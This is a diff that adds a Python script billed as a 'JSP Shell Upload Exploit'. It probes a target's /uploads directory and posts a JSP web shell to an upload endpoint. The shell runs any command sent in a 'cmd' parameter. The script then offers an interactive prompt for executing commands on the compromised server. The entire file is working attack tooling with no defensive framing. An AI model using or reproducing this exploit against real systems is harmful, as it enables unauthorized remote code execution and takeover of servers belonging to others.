@@ -1,0 +1,165 @@
+import requests
+import time
+from urllib.parse import urlparse
+
+def get_base_url():
+    """Prompt user to enter the base URL and ensure it's properly formatted."""
+    while True:
+        base_url = input("\nEnter the base URL (e.g., localhost:8080): ").strip()
+        
+        # Automatically prepend "http://" if the URL doesn't have http:// or https://
+        if not base_url.startswith("http://") and not base_url.startswith("https://"):
+            base_url = "http://" + base_url
+        
+        parsed_url = urlparse(base_url)
+        
+        # Ensure the URL has a valid scheme and netloc
+        if parsed_url.scheme in ['http', 'https'] and parsed_url.netloc:
+            return base_url
+        else:
+            print("[-] Invalid URL format. Please provide a valid URL with the correct scheme (e.g., http://localhost:8080).")
+
+def check_server(base_url):
+    """Check if the server is accessible and the /uploads directory exists, but continue even if it doesn't."""
+    print("[+] Checking server accessibility...")
+    try:
+        # Check if the base URL is reachable
+        response = requests.get(base_url, timeout=10)
+        response.raise_for_status()
+
+        # Check if the /uploads directory exists (this check is now optional)
+        uploads_url = f"{base_url}/uploads/"
+        response = requests.get(uploads_url, timeout=10)
+        
+        if response.status_code == 200:
+            print("[+] /uploads directory is accessible.")
+        elif response.status_code == 404:
+            print("[-] /uploads directory not found (404), but continuing with upload attempt...")
+        else:
+            print(f"[-] Unexpected response from /uploads: {response.status_code}")
+        
+        # Optionally check the server's title or headers for further validation
+        if 'Server' in response.headers:
+            print(f"[+] Server Information: {response.headers['Server']}")
+        
+        return True
+    
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Error connecting to the server: {e}")
+        return False
+
+def upload_shell(base_url):
+    """Upload the JSP shell to the server."""
+    print("[+] Uploading JSP shell...")
+    upload_endpoint = f"{base_url}/uploads/upload.jsp"
+    shell_name = "shell.jsp"
+    shell_content = '''
+    <%@ page import="java.io.*" %>
+    <%
+        if (request.getParameter("cmd") != null) {
+            String cmd = request.getParameter("cmd");
+            Process p = Runtime.getRuntime().exec(cmd);
+            OutputStream os = p.getOutputStream();
+            InputStream in = p.getInputStream();
+            DataInputStream dis = new DataInputStream(in);
+            String line;
+            while ((line = dis.readLine()) != null) {
+                out.println(line);
+            }
+        }
+    %>
+    '''
+    files = {'file': (shell_name, shell_content, 'application/octet-stream')}
+
+    # Retry logic with exponential backoff
+    max_retries = 3
+    for attempt in range(max_retries):
+        try:
+            print(f"[+] Attempting to upload shell (Attempt {attempt + 1}/{max_retries})...")
+            response = requests.post(upload_endpoint, files=files, timeout=10)
+            response.raise_for_status()  # Raise an error for bad responses
+            if response.status_code == 200:
+                print(f"[+] Shell uploaded successfully! Check the URL: {base_url}/uploads/{shell_name}")
+                return True
+            else:
+                print(f"[-] Failed to upload shell. Response Code: {response.status_code}")
+                print(f"Response Text: {response.text}")
+        except requests.exceptions.RequestException as e:
+            print(f"[-] Error during upload (Attempt {attempt + 1}/{max_retries}): {e}")
+            if attempt < max_retries - 1:
+                print("[+] Retrying in 2 seconds...")
+                time.sleep(2)  # Wait for 2 seconds before retrying
+            else:
+                print("[-] Max retries reached. Upload failed.")
+        except Exception as e:
+            print(f"[-] Unexpected error: {e}")
+            break
+    return False
+
+def is_html_output(output):
+    """Check if the output seems to be HTML."""
+    return "<html>" in output.lower() or "<head>" in output.lower()
+
+def parse_command_output(output):
+    """Parse and display command output more intelligently."""
+    if is_html_output(output):
+        print("[+] Command output seems to be HTML. Attempting to extract useful info...")
+        if '<TITLE>' in output:
+            start = output.find('<TITLE>') + len('<TITLE>')
+            end = output.find('</TITLE>')
+            print("[+] Extracted title:", output[start:end])
+        else:
+            print("[+] HTML content detected, but no title found.")
+        return
+    # If it's not HTML, just print the output
+    print("[+] Command output:")
+    print(output)
+
+def execute_command(base_url, command):
+    """Execute command via the uploaded shell."""
+    shell_url = f"{base_url}/uploads/shell.jsp"
+    print(f"[+] Executing command: {command}")
+
+    retries = 3
+    for attempt in range(retries):
+        try:
+            print(f"[+] Attempt {attempt + 1}/{retries}...")
+            params = {'cmd': command}
+            response = requests.get(shell_url, params=params, timeout=10)
+            response.raise_for_status()  # Raise an error for bad responses
+            if response.status_code == 200:
+                parse_command_output(response.text)
+                return
+            else:
+                print(f"[-] Failed to execute command. Response Code: {response.status_code}")
+                print(f"Response Text: {response.text}")
+        except requests.exceptions.RequestException as e:
+            print(f"[-] Error during command execution (Attempt {attempt + 1}/{retries}): {e}")
+            if attempt < retries - 1:
+                print("[+] Retrying in 2 seconds...")
+                time.sleep(2)
+            else:
+                print("[-] Max retries reached. Command execution failed.")
+        except Exception as e:
+            print(f"[-] Unexpected error: {e}")
+            break
+
+def main():
+    """Main program flow."""
+    print("\n[+] Welcome to the JSP Shell Upload Exploit!")
+    
+    base_url = get_base_url()
+    
+    if check_server(base_url) and upload_shell(base_url):
+        while True:
+            command = input("\nEnter the command to execute on the server (or 'exit' to quit): ").strip()
+            if command.lower() == 'exit':
+                print("[+] Exiting...\n")
+                break
+            elif not command:
+                print("[+] Please enter a valid command.")
+                continue
+            execute_command(base_url, command)
+
+if __name__ == "__main__":
+    main()
